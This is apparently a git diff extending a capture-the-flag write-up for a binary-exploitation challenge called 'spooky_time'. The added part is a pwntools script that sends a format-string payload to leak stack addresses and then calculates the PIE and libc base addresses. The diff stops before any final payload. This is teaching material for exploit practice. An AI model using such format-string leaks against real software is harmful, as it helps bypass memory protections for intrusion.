@@ -49,6 +49,7 @@ Everyone loves a good jumpscare, especially kids or the person who does it.. Try
 
 11. Let's calculate them.
 
+#### NOTES: We leak it at the 2nd vuln, but to access it, must at the 1st vuln (so we won't get EOF and we can calc the pie & libc base) 
 
 > SCRIPT 
 
@@ -104,5 +105,82 @@ sh.interactive()
 
 > CALCULATING THE LIBC_BASE
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/df45296e-cae9-4ddd-a2f0-4a1e2a9f2169)
+
+
+From the **vmmap** result we know the libc_base is --> 0x7f0516c00000
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d4e4ce5-7a30-4547-90a3-ae466e3099a6)
+
+
+Calculate result --> 1133111
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/06ffdf84-ffb7-4fdc-b8b7-a9700c6fb1b0)
+
+
+Let's get the pie_base --> 5056
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b9826cfc-c2a2-414a-82d9-0fbcb0c7bc91)
+
+
+> SCRIPT PT.2
+
+```py
+from pwn import *
+import os 
+
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# for remote solve
+gdbscript = '''
+init-pwndbg
+piebase
+breakrva 0x1492
+continue
+'''.format(**locals())
+
+exe = './spooky_time'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = start()
+pause()
+
+sh.sendline('%3$p.%51$p')
+sh.recvuntil(b'than')
+sh.recvline()
+get = sh.recvlineS()
+print('GRABBED:',get)
+
+potential_libc_leak = get[:14]
+#print(potential_libc_leak)
+libc_leak = int(potential_libc_leak, 16)
+log.info('LIBC_LEAK --> %#0x', libc_leak)
+pie_base_leak = get[15:]
+pie_leak = int(pie_base_leak, 16)
+log.info('PIE_LEAK --> %#0x', pie_leak)
+#print(pie_base_leak)
+
+elf.address = pie_leak - 0x13c0 #5056 
+log.info('Calculated base address --> %#0x', elf.address)
+
+libc.address = libc_leak - 0x114a37 #1133111
+log.info('Calculated lib_base --> %#0x', libc.address)
+
+sh.interactive()
+```
+
+> RESULT
 
 
